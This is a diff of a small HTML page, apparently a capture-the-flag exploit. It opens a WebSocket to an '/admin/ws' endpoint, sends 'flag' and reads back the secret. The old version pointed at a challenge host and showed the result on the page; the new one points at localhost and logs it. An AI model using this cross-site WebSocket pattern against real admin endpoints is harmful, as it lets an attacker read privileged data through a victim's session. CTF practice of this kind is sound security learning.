@@ -2,40 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit</title>
+    <title>Flag Retrieval</title>
 </head>
 <body>
-    <h1>Flag Retrieval Page</h1>
-    <p id="status">Waiting for flag...</p>
-    <p id="flag"></p>
-
     <script>
-        const ws = new WebSocket("ws://ce441-web.spchallenge.ir:8080/admin/ws");
+        const ws = new WebSocket('ws://localhost:8080/admin/ws');
 
         ws.onopen = () => {
-            console.log("WebSocket connection opened.");
-            document.getElementById("status").textContent = "Connected to WebSocket. Requesting flag...";
-
-            ws.send("flag");
+            ws.send('flag');
         };
 
         ws.onmessage = (event) => {
-            console.log("Received message:", event.data);
-
-            document.getElementById("status").textContent = "Flag received!";
-            document.getElementById("flag").textContent = `Flag: ${event.data}`;
-
+            const flag = event.data;
+            
+            console.log("Flag:", flag);
+            
             ws.close();
-        };
-
-        ws.onerror = (error) => {
-            console.error("WebSocket error:", error);
-            document.getElementById("status").textContent = "Error occurred during WebSocket connection.";
-        };
-
-        ws.onclose = () => {
-            console.log("WebSocket connection closed.");
-            document.getElementById("status").textContent = "WebSocket connection closed.";
         };
     </script>
 </body>
